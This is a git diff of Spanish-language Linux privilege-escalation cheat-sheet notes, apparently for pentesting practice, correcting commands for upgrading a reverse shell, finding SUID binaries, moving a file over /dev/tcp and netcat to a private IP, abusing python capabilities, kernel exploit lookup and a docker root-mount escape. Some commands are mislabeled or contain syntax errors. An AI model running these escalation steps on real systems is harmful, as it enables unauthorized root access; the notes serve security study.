@@ -35,11 +35,12 @@ sudo -l -l
 ```bash
 script /dev/null -c bash
 Ctrol + Z
-ssty raw -echo ; fg # llevr netcat a 2 plano
+stty raw -echo ; fg # llevr netcat a 2 plano
 reset xterm # o el visor que utilices
-ssty size # ver size de nuestra terminal
-ssty rows loquemedigamiterminal columns loquemedigamiterminal # en la revshell
+stty size # ver size de nuestra terminal
 export TERM=xterm
+export SHELL=bash
+stty rows loquemedigamiterminal columns loquemedigamiterminal # en la revshell
 ```
 
 ## Abusando de Privilegios SUID - Set User ID
@@ -52,7 +53,7 @@ export TERM=xterm
 > Commands Para **SUID** para **SGID**
 ```bash
 SUID
-find -perm -4000 -ls 2>/dev/null
+find / -perm -4000 -ls 2>/dev/null
 SGID
 find / -perm -4000 -o -perm -2000 -exec ls -ld {} \; 2>/dev/null
 AMBOS
@@ -90,11 +91,12 @@ systemctl list-timers
 
 - Víctima: leo el archivo que publica la máquina atacante y lo meto en `pspy` para que sea un binario
 ```bash
-cat < /dev/tcp/ipatacante/puerto_atacante > pspy
+nc -nlvp 443 > pspy
 ```
 - Atacante Publico el archivo pspy
 ```bash
-nc -nlvp 443 < pspy
+cat > /dev/tcp/192.168.1.135/443 < /usr/local/bin/pspy
+nc 192.168.1.135 443 < /usr/local/bin/pspy
 ```
 
 
@@ -267,8 +269,8 @@ curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-
 >En sistemas unix, las capabilities son funcio nalidades que permiten al usuario ejecutar acciones privilegiadas sin necesidad de ser superuser
 
 >**Permisos permitidos (permitted capabilities)**: son los permisos que un proceso tiene permitidos. Esto incluye tanto permisos efectivos como heredados. Un proceso solo puede ejecutar acciones para las que tiene permisos permitidos.
->
-**Permisos heredados (inheritable capabilities)**: son los permisos que se heredan por los procesos hijos que son creados. Estos permisos pueden ser adicionales a los permisos efectivos que ya posee el proceso padre.
+ 
+>**Permisos heredados (inheritable capabilities)**: son los permisos que se heredan por los procesos hijos que son creados. Estos permisos pueden ser adicionales a los permisos efectivos que ya posee el proceso padre.
 
 >**Permisos efectivos (effective capabilities)**: son los permisos que se aplican directamente al proceso que los posee. Estos permisos determinan las acciones que el proceso puede realizar
 
@@ -317,6 +319,8 @@ python3.10 -c 'import os; os.setuid(0); os.system("bash)'
 ```bash
 lsb_release -a
 uname -a
+cat /etc/os-release
+searchsploit  S.O
 
 searchsploit kernel 3.20
 
@@ -349,8 +353,8 @@ id
 - Imaginemos que es **docker**, montamos el directorio personal de **/mnt/root** en la raíz de la máquina comprometida , ya vimos que esta montura hacía un enlace simbólico.
 
 ```bash
-docker run --rm -dit -v /:/mnt/root --name privesc ubuntu
-docker exec --it privesc bash
+docker run -dit -v /:/mnt/root --name privesc ubuntu
+docker exec -it privesc bash
 
 ls /mnt/root
 
